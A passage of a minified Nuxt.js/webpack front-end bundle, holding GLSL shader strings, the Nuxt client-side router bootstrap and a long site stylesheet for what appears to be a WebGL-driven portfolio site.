power,\n\t\tuv_scale.y\n\t);\n\n\tif( uv_disp.x > 1.0 ) {\n\t\tuv_disp.x = 2.0 - uv_disp.x;\n\t}\n\tif( uv_disp.x < 0.0 ) {\n\t\tuv_disp.x = -1.0 * uv_disp.x;\n\t}\n\tif( uv_disp.y > 1.0 ) {\n\t\tuv_disp.y = 2.0 - uv_disp.y;\n\t}\n\tif( uv_disp.y < 0.0 ) {\n\t\tuv_disp.y = -1.0 * uv_disp.y;\n\t}\n\n\t//==========\n\tvec2  r_displaced  = vec2( uv_disp.x, uv_disp.y - rgb_shift *       (1.0-vUv.y) );\n\tvec2  g_displaced  = vec2( uv_disp.x, uv_disp.y - rgb_shift * 2.0 * (1.0-vUv.y) );\n\tvec2  b_displaced  = vec2( uv_disp.x, uv_disp.y - rgb_shift * 3.0 * (1.0-vUv.y) );\n\tfloat mix_r = texture2D( tDiffuse, r_displaced ).r;\n\tfloat mix_g = texture2D( tDiffuse, g_displaced ).g;\n\tfloat mix_b = texture2D( tDiffuse, b_displaced ).b;\n\tfloat r = mix_r * alpha * opacity + rgb;\n\tfloat g = mix_g * alpha * opacity + rgb;\n\tfloat b = mix_b * alpha * opacity + rgb;\n\n\t//==========\n\tfloat a = pow( ( vUv.y + gradient ) , 2.0 );\n\tvec4 texel = vec4( r, g, b, a );\n\tgl_FragColor  = texel * alpha * opacity + rgb;\n\n\t// gl_FragColor = texture2D( tDiffuse, vUv );\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nuniform sampler2D fillText;\nuniform vec2 offset;\n\n// uniform sampler2D strokeText;\n// uniform vec2 pivot;\n// uniform float radius;\n\nvoid main() {\n\n\tfloat dx = vUv.x - offset.x;\n\tfloat dy = vUv.y - offset.y;\n\tvec2 uv_displaced = vec2( dx, dy );\n\tvec4 fill   = texture2D( fillText, uv_displaced );\n\n\t// vec4 stroke = texture2D( strokeText, uv_displaced );\n\t// float distance = length( gl_FragCoord.xy - pivot );\n\t// if( distance < radius ){\n\t// \tgl_FragColor = ( ( fill * pow( distance/radius , 20.0 ) ) + stroke );\n\t// } else {\n\t// \tgl_FragColor = fill;\n\t// }\n\n\tgl_FragColor = fill;\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}"},function(t,e){t.exports="#define GLSLIFY 1\nuniform float rgb;\nuniform float a;\nvoid main() {\n\tgl_FragColor.r = rgb;\n\tgl_FragColor.g = rgb;\n\tgl_FragColor.b = rgb;\n\tgl_FragColor.a = a;\n}"},function(t,e){t.exports="#define GLSLIFY 1\nuniform float twistTime;\nuniform float twistHeight;\nuniform float twistAngleDegMax;\n\nvec4 twist( vec4 pos, float t ){\n\tfloat st = sin(t);\n\tfloat ct = cos(t);\n\tvec4 new_pos;\n\tnew_pos.x = pos.x * ct - pos.z * st;\n\tnew_pos.z = pos.x * st + pos.z * ct;\n\tnew_pos.y = pos.y;\n\tnew_pos.w = pos.w;\n\treturn( new_pos );\n}\n\nvoid main(){\n\n\tfloat angleDeg  = twistAngleDegMax * sin(twistTime);\n\tfloat angleRad  = angleDeg * 3.14159 / 180.0;\n\tfloat angle     = (twistHeight * 0.5 + position.y) / twistHeight * angleRad;\n\tvec4 twistedPosition = twist(vec4( position, 1.0 ), angle);\n\tvec4 mvPosition = modelViewMatrix * twistedPosition;\n\n\t// vec4 twistedNormal = twist(vec4(c, 0.0), angle);\n\t// objectNormal = twistedNormal.xyz;\n\t// transformedNormal = normalMatrix * objectNormal;\n\n\tgl_Position = projectionMatrix * mvPosition;\n\n\t// gl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nuniform float power;\nuniform float x;\nuniform float y;\nuniform float dir;\nuniform float type;\nuniform float rgb;\nuniform float radius;\nuniform float hole;\nuniform vec2  mouse;\nuniform vec2  resolution;\nvoid main() {\n\n\t//\n\tfloat _a   = 0.0;\n\tfloat _pow = 1.0;\n\tfloat _aspect   = resolution.x / resolution.y;\n\n\tif( type == 0.0 ){\n\n\t\t_a = power * pow( ( 1.0 -  vUv.y + y ) , _pow );\n\t\tif( dir == 1.0 ){\n\t\t\t_a = power * pow( ( vUv.y + y ) , _pow );\n\t\t}\n\n\t} else if( type == 1.0 ){\n\n\t\t_a = power * pow( ( 1.0 -  vUv.x + x ) , _pow );\n\t\tif( dir == 1.0 ){\n\t\t\t_a = power * pow( ( vUv.x + x ) , _pow );\n\t\t}\n\n\t} else if( type == 2.0 ){\n\n\t\tvec2  _vec      = ( vUv - mouse ) * vec2( max(1.0,_aspect), max(1.0,1.0/_aspect) );\n\t\tfloat _distance = length( _vec );\n\t\tfloat _base = max( 1.0 - pow( _distance / radius , _pow ) , 0.0 ) + power;\n\t\tfloat _hole = max( 1.0 - pow( _distance / hole , _pow*2.0 ) , 0.0 );\n\t\t_a = _base - _hole;\n\n\t}\n\n\tgl_FragColor.r = rgb;\n\tgl_FragColor.g = rgb;\n\tgl_FragColor.b = rgb;\n\tgl_FragColor.a = _a;\n\n\t// gl_FragColor.r = 1.0;\n\t// gl_FragColor.g = 0.0;\n\t// gl_FragColor.b = 0.0;\n\t// gl_FragColor.a = 1.0;\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}"},,function(t,e,i){t.exports=i(178)},function(t,e,i){"use strict";i.r(e),function(t){var e=i(7),n=(i(35),i(101),i(31),i(36),i(29),i(71),i(84),i(9),i(5),i(21),i(4),i(105),i(186),i(191),i(192),i(2)),r=i(158),a=i(74),o=i(3),s=i(52),l=i(94);n.a.component(l.a.name,l.a),n.a.component("NLink",l.a),t.fetch||(t.fetch=r.a);var c,h,u=[],d=window.__NUXT__||{};Object.assign(n.a.config,{silent:!0,performance:!1});var p=n.a.config.errorHandler||console.error;function f(t,e,i){var n=function(t){var n=function(t,e){if(!t||!t.options||!t.options[e])return{};var i=t.options[e];if("function"==typeof i){for(var n=arguments.length,r=new Array(n>2?n-2:0),a=2;a<n;a++)r[a-2]=arguments[a];return i.apply(void 0,r)}return i}(t,"transition",e,i)||{};return"string"==typeof n?{name:n}:n};return t.map((function(t){var e=Object.assign({},n(t));if(i&&i.matched.length&&i.matched[0].components.default){var r=n(i.matched[0].components.default);Object.keys(r).filter((function(t){return r[t]&&t.toLowerCase().includes("leave")})).forEach((function(t){e[t]=r[t]}))}return e}))}function m(t,e,i){this._pathChanged=Boolean(c.nuxt.err)||e.path!==t.path,this._queryChanged=JSON.stringify(t.query)!==JSON.stringify(e.query),this._diffQuery=this._queryChanged?Object(o.g)(t.query,e.query):[];try{i()}catch(o){var n=o||{},r=n.statusCode||n.status||n.response&&n.response.status||500,a=n.message||"";if(/^Loading( CSS)? chunk (\d)+ failed\./.test(a))return void window.location.reload(!0);this.error({statusCode:r,message:a}),this.$nuxt.$emit("routeChanged",t,e,n),i()}}function _(t,e){return d.serverRendered&&e&&Object(o.a)(t,e),t._Ctor=t,t}function g(t){var e=Object(o.d)(t.options.base,t.options.mode);return Object(o.c)(t.match(e),(function(t,e,i,n,r){var a;return regeneratorRuntime.async((function(e){for(;;)switch(e.prev=e.next){case 0:if("function"!=typeof t||t.options){e.next=4;break}return e.next=3,regeneratorRuntime.awrap(t());case 3:t=e.sent;case 4:return a=_(Object(o.n)(t),d.data?d.data[r]:null),i.components[n]=a,e.abrupt("return",a);case 7:case"end":return e.stop()}}))}))}function v(t,e,i){var n=this,r=["pages","i18n"],s=!1;if(void 0!==i&&(r=[],(i=Object(o.n)(i)).options.middleware&&(r=r.concat(i.options.middleware)),t.forEach((function(t){t.options.middleware&&(r=r.concat(t.options.middleware))}))),r=r.map((function(t){return"function"==typeof t?t:("function"!=typeof a.a[t]&&(s=!0,n.error({statusCode:500,message:"Unknown middleware "+t})),a.a[t])})),!s)return Object(o.k)(r,e)}function y(t,e,i){var n,r,a,l,h,d,p,m,_,g,y,x,b,w,T,S,M,E=this;return regeneratorRuntime.async((function(L){for(;;)switch(L.prev=L.next){case 0:if(!1!==this._pathChanged||!1!==this._queryChanged){L.next=2;break}return L.abrupt("return",i());case 2:return t===e?u=[]:(n=[],u=Object(o.e)(e,n).map((function(t,i){return Object(o.b)(e.matched[n[i]].path)(e.params)}))),r=!1,a=function(t){r||(r=!0,i(t))},L.next=7,regeneratorRuntime.awrap(Object(o.o)(c,{route:t,from:e,next:a.bind(this)}));case 7:if(this._dateLastError=c.nuxt.dateErr,this._hadError=Boolean(c.nuxt.err),l=[],(h=Object(o.e)(t,l)).length){L.next=25;break}return L.next=14,regeneratorRuntime.awrap(v.call(this,h,c.context));case 14:if(!r){L.next=16;break}return L.abrupt("return");case 16:return L.next=18,regeneratorRuntime.awrap(this.loadLayout("function"==typeof s.a.layout?s.a.layout(c.context):s.a.layout));case 18:return d=L.sent,L.next=21,regeneratorRuntime.awrap(v.call(this,h,c.context,d));case 21:if(!r){L.next=23;break}return L.abrupt("return");case 23:return c.context.error({statusCode:404,message:"This page could not be found"}),L.abrupt("return",i());case 25:return h.forEach((function(t){t._Ctor&&t._Ctor.options&&(t.options.asyncData=t._Ctor.options.asyncData,t.options.fetch=t._Ctor.options.fetch)})),this.setTransitions(f(h,t,e)),L.prev=27,L.next=30,regeneratorRuntime.awrap(v.call(this,h,c.context));case 30:if(!r){L.next=32;break}return L.abrupt("return");case 32:if(!c.context._errored){L.next=34;break}return L.abrupt("return",i());case 34:return"function"==typeof(p=h[0].options.layout)&&(p=p(c.context)),L.next=38,regeneratorRuntime.awrap(this.loadLayout(p));case 38:return p=L.sent,L.next=41,regeneratorRuntime.awrap(v.call(this,h,c.context,p));case 41:if(!r){L.next=43;break}return L.abrupt("return");case 43:if(!c.context._errored){L.next=45;break}return L.abrupt("return",i());case 45:m=!0,L.prev=46,_=!0,g=!1,y=void 0,L.prev=50,x=h[Symbol.iterator]();case 52:if(_=(b=x.next()).done){L.next=64;break}if("function"==typeof(w=b.value).options.validate){L.next=56;break}return L.abrupt("continue",61);case 56:return L.next=58,regeneratorRuntime.awrap(w.options.validate(c.context));case 58:if(m=L.sent){L.next=61;break}return L.abrupt("break",64);case 61:_=!0,L.next=52;break;case 64:L.next=70;break;case 66:L.prev=66,L.t0=L.catch(50),g=!0,y=L.t0;case 70:L.prev=70,L.prev=71,_||null==x.return||x.return();case 73:if(L.prev=73,!g){L.next=76;break}throw y;case 76:return L.finish(73);case 77:return L.finish(70);case 78:L.next=84;break;case 80:return L.prev=80,L.t1=L.catch(46),this.error({statusCode:L.t1.statusCode||"500",message:L.t1.message}),L.abrupt("return",i());case 84:if(m){L.next=87;break}return this.error({statusCode:404,message:"This page could not be found"}),L.abrupt("return",i());case 87:return L.next=89,regeneratorRuntime.awrap(Promise.all(h.map((function(i,n){if(i._path=Object(o.b)(t.matched[l[n]].path)(t.params),i._dataRefresh=!1,E._pathChanged&&E._queryChanged||i._path!==u[n])i._dataRefresh=!0;else if(!E._pathChanged&&E._queryChanged){var r=i.options.watchQuery;!0===r?i._dataRefresh=!0:Array.isArray(r)?i._dataRefresh=r.some((function(t){return E._diffQuery[t]})):"function"==typeof r&&(T||(T=Object(o.f)(t)),i._dataRefresh=r.apply(T[n],[t.query,e.query]))}if(E._hadError||!E._isMounted||i._dataRefresh){var a=[],s=i.options.asyncData&&"function"==typeof i.options.asyncData,h=Boolean(i.options.fetch);if(s){var d=Object(o.m)(i.options.asyncData,c.context).then((function(t){Object(o.a)(i,t)}));a.push(d)}if(E.$loading.manual=!1===i.options.loading,h){var p=i.options.fetch(c.context);p&&(p instanceof Promise||"function"==typeof p.then)||(p=Promise.resolve(p)),p.then((function(t){})),a.push(p)}return Promise.all(a)}}))));case 89:r||i(),L.next=106;break;case 92:if(L.prev=92,L.t2=L.catch(27),"ERR_REDIRECT"!==(S=L.t2||{}).message){L.next=97;break}return L.abrupt("return",this.$nuxt.$emit("routeChanged",t,e,S));case 97:return u=[],Object(o.i)(S),"function"==typeof(M=s.a.layout)&&(M=M(c.context)),L.next=103,regeneratorRuntime.awrap(this.loadLayout(M));case 103:this.error(S),this.$nuxt.$emit("routeChanged",t,e,S),i();case 106:case"end":return L.stop()}}),null,this,[[27,92],[46,80],[50,66,70,78],[71,,73,77]])}function x(t,i){Object(o.c)(t,(function(t,i,r,a){return"object"!==Object(e.a)(t)||t.options||((t=n.a.extend(t))._Ctor=t,r.components[a]=t),t}))}function b(t){this._hadError&&this._dateLastError===this.$options.nuxt.dateErr&&this.error();var e=this.$options.nuxt.err?s.a.layout:t.matched[0].components.default.options.layout;"function"==typeof e&&(e=e(c.context)),this.setLayout(e)}function w(t,e){var i=this;if(!1!==this._pathChanged||!1!==this._queryChanged){var r=Object(o.f)(t),a=Object(o.e)(t);n.a.nextTick((function(){r.forEach((function(t,e){if(t&&!t._isDestroyed&&t.constructor._dataRefresh&&a[e]===t.constructor&&!0!==t.$vnode.data.keepAlive&&"function"==typeof t.constructor.options.data){var i=t.constructor.options.data.call(t);for(var r in i)n.a.set(t.$data,r,i[r]);window.$nuxt.$nextTick((function(){window.$nuxt.$emit("triggerScroll")}))}})),b.call(i,t)}))}}function T(t){window.onNuxtReadyCbs.forEach((function(e){"function"==typeof e&&e(t)})),"function"==typeof window._onNuxtLoaded&&window._onNuxtLoaded(t),h.afterEach((function(e,i){n.a.nextTick((function(){return t.$nuxt.$emit("routeChanged",e,i)}))}))}Object(s.b)().then((function(t){var e,i,r,a,s;return regeneratorRuntime.async((function(l){for(;;)switch(l.prev=l.next){case 0:return c=t.app,h=t.router,t.store,e=new n.a(c),i=d.layout||"default",l.next=7,regeneratorRuntime.awrap(e.loadLayout(i));case 7:return e.setLayout(i),r=function(){e.$mount("#__nuxt"),h.afterEach(x),h.afterEach(w.bind(e)),n.a.nextTick((function(){T(e)}))},l.next=11,regeneratorRuntime.awrap(Promise.all(g(h)));case 11:if(a=l.sent,e.setTransitions=e.$options.nuxt.setTransitions.bind(e),a.length&&(e.setTransitions(f(a,h.currentRoute)),u=h.currentRoute.matched.map((function(t){return Object(o.b)(t.path)(h.currentRoute.params)}))),e.$loading={},d.error&&e.error(d.error),h.beforeEach(m.bind(e)),h.beforeEach(y.bind(e)),!d.serverRendered){l.next=21;break}return r(),l.abrupt("return");case 21:s=function(){x(h.currentRoute,h.currentRoute),b.call(e,h.currentRoute),r()},y.call(e,h.currentRoute,h.currentRoute,(function(t){if(t){var e=h.afterEach((function(t,i){e(),s()}));h.push(t,void 0,(function(t){t&&p(t)}))}else s()}));case 23:case"end":return l.stop()}}))})).catch(p)}.call(this,i(43))},,,,,,,,,,,,,,,function(t,e,i){"use strict";i.r(e),i(4),e.default=function(t){t.store.commit("updatePage",{path:t.route.path,name:t.route.name,slug:t.route.params.slug})}},,,,,,,,,function(t,e,i){"use strict";var n=i(93);i.n(n).a},function(t,e,i){(t.exports=i(141)(!1)).push([t.i,".__nuxt-error-page{padding:1rem;background:#f7f8fb;color:#47494e;text-align:center;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;font-family:sans-serif;font-weight:100!important;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-webkit-font-smoothing:antialiased;position:absolute;top:0;left:0;right:0;bottom:0}.__nuxt-error-page .error{max-width:450px}.__nuxt-error-page .title{font-size:1.5rem;margin-top:15px;color:#47494e;margin-bottom:8px}.__nuxt-error-page .description{color:#7f828b;line-height:21px;margin-bottom:10px}.__nuxt-error-page a{color:#7f828b!important;text-decoration:none}.__nuxt-error-page .logo{position:fixed;left:12px;bottom:12px}",""])},function(t,e,i){var n=i(205);"string"==typeof n&&(n=[[t.i,n,""]]),n.locals&&(t.exports=n.locals),(0,i(157).default)("d5573df6",n,!0,{sourceMap:!1})},function(t,e,i){(t.exports=i(141)(!1)).push([t.i,'html{-webkit-taphighlight-color:hsla(0,0%,100%,0);-webkit-text-size-adjust:100%;font-size:62.5%}blockquote,body,button,code,dd,div,dl,dt,fieldset,figcaption,figure,form,h1,h2,h3,h4,h5,h6,input,legend,li,ol,p,pre,select,td,textarea,th,ul{margin:0;padding:0}table{border-collapse:collapse;border-spacing:0}fieldset,img{border:0}address,button,caption,cite,code,dfn,em,input,optgroup,option,select,strong,textarea,th,var{font:inherit}del,ins{text-decoration:none}li{list-style:none}caption,th{text-align:left}h1,h2,h3,h4,h5,h6{font-size:100%;font-weight:400}q:after,q:before{content:""}abbr,acronym{border:0;-webkit-font-feature-settings:normal;font-feature-settings:normal;font-variant:normal}sub,sup{vertical-align:baseline}legend{color:#000}.cf:after,.cf:before{content:"";display:table}.cf:after{clear:both}.cf{zoom:1}body,html{width:100%;height:100%;font-family:Now,Hiragino Kaku Gothic ProN,ヒラギノ角ゴ ProN W3,Meiryo,メイリオ,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;overscroll-behavior-y:none}*{outline:none;-webkit-box-sizing:border-box;box-sizing:border-box}img,svg{vertical-align:bottom}a{text-decoration:none}a,body{color:#fafafa;-webkit-tap-highlight-color:rgba(0,0,0,0)}.js-dragging *{user-select:none!important;-moz-user-select:none!important;-webkit-user-select:none!important;-ms-user-select:none!important}body{background:#030303;letter-spacing:-.02em}.page-title *,body{-ms-user-select:none;user-select:none;-webkit-user-select:none;-moz-user-select:none;-khtml-user-select:none;-webkit-user-drag:none;-khtml-user-drag:none}.page-header .section-information *{pointer-events:auto}.page-body *,.section-information *{-ms-user-select:text;user-select:text;-webkit-user-select:text;-moz-user-select:text;-khtml-user-select:text}::selection{background:#777;color:#fff}::-moz-selection{background:#777;color:#fff}::-webkit-scrollbar{width:0}::-webkit-scrollbar-track{position:fixed}::-webkit-scrollbar-thumb{position:fixed;background:transparent}.page-title-in .title .o{display:inline-block;min-width:.35em}.page-title-in,.site-nav-a{font-weight:700;font-family:Neue,sans-serif}.page-title-in .title{font-weight:700;line-height:.9;letter-spacing:0}.site-copy,body{font-size:.825vw}.ja{font-size:1.0725vw}.ja2{font-size:.86625vw}.logo-a .ja{font-size:.858vw}.page-content,small{font-size:.86625vw}.editor h2,.section-text .h1{font-size:2.35628vw}.caption h2,.caption h3,.caption h4,.editor h3,.section-text .h2{font-size:1.81252vw}.flip-btn .ja{font-size:1.45002vw}.editor h4,.flip-btn,.section-text .h3{font-size:1.39425vw}.support{font-size:.86625vw}.logo-h1,.site-nav-sns ul,.works-header .h2{font-size:1.0725vw}.page-title-in,.section-title{font-size:6.2vw}.page-title-in .ja{font-size:5.27vw}.page-title-l{font-size:6.85vw}.page-title-l .ja{font-size:6.165vw}.site-nav-a{font-size:6.85vw}.page-header{opacity:0;pointer-events:none}.caption h2,.caption h3,.caption h4,.editor h2,.editor h3,.editor h4,.flex-li .h3,.flex-li .h4,.section-text .h1,.section-text .h2,.section-text .h3,.section-text .h4,.section-title{font-weight:400;line-height:1.3}.side{position:fixed}.site-background{z-index:0}#js--gl-back,#js--video{z-index:1}.site-body{z-index:3}#js--gl-front{z-index:4}.control-to,.side{z-index:5}.is-page-in-works #js--gl-front,.site-mask{z-index:6}.site-nav{z-index:7}.site-header .side{z-index:10}.is-page-tr-start .site-content>.side{z-index:3}.ui-toggle{right:0;top:0}.a-blank{bottom:0;left:calc(8.5vh - 10px)}.a-reel{bottom:0;left:10vh}.a-all,.a-scroll,.address{bottom:0}.a-all,.a-scroll,.address,.ui-select{-webkit-transform:translate(-50%);transform:translate(-50%);left:50%}.ui-select{bottom:calc(8.5vh - 10px)}.ui-category{top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.ui-ar,.ui-category{right:calc(8.5vh - 10px)}.ui-ar{bottom:20vh}.a-more{bottom:15vh;right:calc(15vw - 8.5vh)}.a-pagging,.ui-audio{bottom:0;right:0}.ui-fullscreen{bottom:0;right:17vh}.ui-scroll,.ui-video-progress{bottom:0;left:0}.ui-num{bottom:0;right:calc(8.5vh - 10px)}.logo-wrap{top:0;left:calc(8.5vh - 10px)}.site-nav-sns{left:calc(8.5vh - 10px)}.site-copy,.site-nav-sns{bottom:calc(8.5vh - 10px)}.site-copy{right:calc(8.5vh - 10px)}.page-inner{min-height:100%}.site-background{width:100%;height:100%;position:fixed;background:red;top:0;left:0}.page-content{height:100%}#js--video{left:0;bottom:0;position:fixed}#js--video video{display:none;width:10px;height:5px}.ja{font-weight:700}.site-body{overflow:hidden;width:100vw;height:100vh;position:fixed;top:0;left:0}.in{position:relative;width:100%;height:100%}.gs1{-webkit-text-stroke-color:hsla(0,0%,100%,.15)}.gs1,.gs2{-webkit-text-stroke-width:1px;color:transparent}.gs2{-webkit-text-stroke-color:hsla(0,0%,100%,.3)}.gl{position:fixed;width:100%!important;height:100%!important;top:0;left:0}.wh{height:100vh}.spr{clear:both}.spr-none{height:0}.spr-0{min-height:320px;height:40vh}.spr-1{min-height:280px;height:35vh}.spr-2{min-height:200px;height:25vh}.spr-3{min-height:160px;height:20vh}.spr-4{min-height:80px;height:10vh}.spr-5{min-height:40px;height:5vh}.logo-wrap{-webkit-box-align:center;-ms-flex-align:center;align-items:center;height:17vh}.logo-body,.logo-wrap{display:-webkit-box;display:-ms-flexbox;display:flex}.logo-body{-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline}.body{width:70vw;margin:0 auto}.body.thin{width:60vw;margin:0 auto}#js--resource{position:fixed;top:0;left:-9999px}.ui-audio,.ui-fullscreen,.ui-toggle,.ui-toggle-in{width:17vh;height:17vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.ui-audio-body,.ui-toggle-body{width:20px}.ui-toggle{width:22vh;padding-left:5vh}.bg-img{width:100%;height:100%;opacity:0;background-size:cover;-webkit-transition:all 1s cubic-bezier(.4,.22,.21,1.04);transition:all 1s cubic-bezier(.4,.22,.21,1.04);background-position:50%;background-repeat:no-repeat}.iframe-fullscreen-body .img-loaded .bg-img{opacity:.5}.img-loaded .bg-img{opacity:1}.link-body,.site-copy,.site-copy a,.ui-category-ul a,.ui-lang a,.ui-num .in{font-weight:300;color:#8c8c8c}.ui-category-ul a.nuxt-link-exact-active{color:#fafafa}.site-nav-legal{margin-top:3em}.logo-h1{font-weight:700}.logo-a{position:relative;line-height:1.35;letter-spacing:-.04em;font-weight:500;width:10vw;padding:1em 0}.logo-a,.logo-a .t{display:block}.ui-lang,.ui-lang .flip-a{display:block;vertical-align:bottom}.ui-lang-a{padding:2em;display:block;margin:0 0 0 -2em;cursor:pointer}.ui-lang-a *{pointer-events:none}.ui-toggle{cursor:pointer}.ui-toggle .t{width:100%;height:2px;position:absolute;top:50%;margin-top:-1px;overflow:hidden}.ui-toggle .t1{-webkit-transform:translateY(-3px);transform:translateY(-3px)}.ui-toggle .t2{-webkit-transform:translateY(3px);transform:translateY(3px)}.ui-toggle .t div{background:#fafafa;height:100%;width:100%}.site-header a{-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.ui-toggle .t div{-webkit-transition:background .5s cubic-bezier(.4,.22,.21,1.04);transition:background .5s cubic-bezier(.4,.22,.21,1.04)}.logo-svg{width:127px;height:127px;top:50%;left:50%;-webkit-transform:translate(-50%,-50%) scale(1.4);transform:translate(-50%,-50%) scale(1.4);position:absolute;margin-top:-1px}.logo-svg-wrap path,.logo-svg path{fill:#fafafa}.logo-img{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.logo-img img{width:91px;height:91px}.logo-icon{width:17vh;height:17vh;top:0;left:50%;margin-left:-8.5vh;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;opacity:1;-webkit-transform:translateY(41.5vh);transform:translateY(41.5vh)}.logo-icon *{pointer-events:none}.logo-icon .t{text-indent:-9999px}.site-nav{position:fixed;width:100%;height:100%;top:0;left:0}.site-nav-body{width:100%;height:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-nav-left .flip-a span{white-space:nowrap}.site-nav-ul{width:100%}.site-nav-li{margin-bottom:-.25em;margin-right:-.55em;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;position:relative;-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.site-nav-li .clip-t{padding:0 .05em}.site-nav-a{padding:0;position:relative;overflow:hidden;cursor:pointer}.site-nav-a,.site-nav-a .t{display:block}.site-nav-a *{pointer-events:none}.site-nav-li .n{padding-top:.8em}.site-nav .flex-li{padding:0}.site-nav-ul span{display:block}.site-nav .section-information{width:20%}.site-nav-in{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.site-copy,.site-nav-in,.site-nav-sns{display:-webkit-box;display:-ms-flexbox;display:flex}.site-copy,.site-nav-sns{z-index:2;position:absolute;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-copy span{display:block}.site-nav-sns ul{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin:0 -.75em}.site-nav-sns a{padding:0 .75em;display:block}.address{height:17vh;position:absolute;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.site-nav-address p{display:inline}.section .flex-li.site-nav-address .h3{font-weight:500}.flip-btn-wrap .clip-w{display:inline-block}.flip-a,.section .flip-a{text-decoration:none}.flip-a{overflow:hidden;display:inline-block;vertical-align:top}.flip-a,.flip-a .i{line-height:1.3;height:1.3em}.site-nav-li .site-nav-a,.title .flip-a{line-height:.9;height:.9em}.title .flip-a{padding:0 .1em}.flip-a span{display:block}.flip-a .b span,.flip-a .f span{display:inline-block;vertical-align:top}.flip-a .t,.site-nav-a .t{-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04)}.flip-btn-wrap{margin-top:2.35628vw}.flip-btn{font-weight:500}.flip-btn.ja{font-weight:700}.site-nav .nuxt-link-exact-active{pointer-events:none;cursor:default!important}.no-events *{pointer-events:none}.link-body{padding:1em;display:-webkit-box;display:-ms-flexbox;display:flex;margin:0 -1em;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.a-all,.a-scroll{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.a-all,.a-blank,.a-scroll{font-weight:400;width:17vh;height:17vh}.a-all,.a-blank,.a-scroll,.link .txt,.parts .txt{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.link .txt,.parts .txt{height:100%;width:100%;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.link .bd,.parts .bd{position:absolute;display:block;width:2px;height:30px;background:#fafafa;bottom:0;left:50%;margin-left:-1px}.a-more{-webkit-writing-mode:vertical-rl;-ms-writing-mode:tb-rl;writing-mode:vertical-rl;display:block;padding:0;line-height:1;cursor:pointer}.a-more .txt{display:block;padding:.8em 0}.a-more .bd{position:absolute;left:0;bottom:0;display:block;height:2px;width:100%}.a-more{height:17vh;width:17vh}.a-more .in{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;height:auto}.a-more .in,.flip-vr .flex{display:-webkit-box;display:-ms-flexbox;display:flex}.flip-vr .flex{-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04);-webkit-transform:translate(50%);transform:translate(50%)}.flip-vr-body{overflow:hidden}.flip-vr .flex .b,.flip-vr .flex .f{display:block}.flip-vr .ja{padding-top:.2em;letter-spacing:.2em}.flip-vr .en{padding-top:0;text-align:center;font-weight:500}.a-pivot,.a-wrap{height:17vh}.a-pivot{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;width:17vh}.a-txt{padding:1em}.ui-ar{cursor:pointer;margin-bottom:-.4em}.i-ar-d,.i-ar-l,.i-ar-r,.i-ar-u{-webkit-transform:scale(1.25);transform:scale(1.25);display:block}.ui-ar .i{width:100%;height:1.2em;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.ui-scroll{height:17vh;padding:0 8.5vh}.ui-scroll .in{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.ui-select-wrap{background:#fafafa;width:100%;height:8.5vh;width:21.25vh;border-radius:8.5vh}.ui-select-body,.ui-select select{width:100%;height:100%}.ui-select select{padding:0 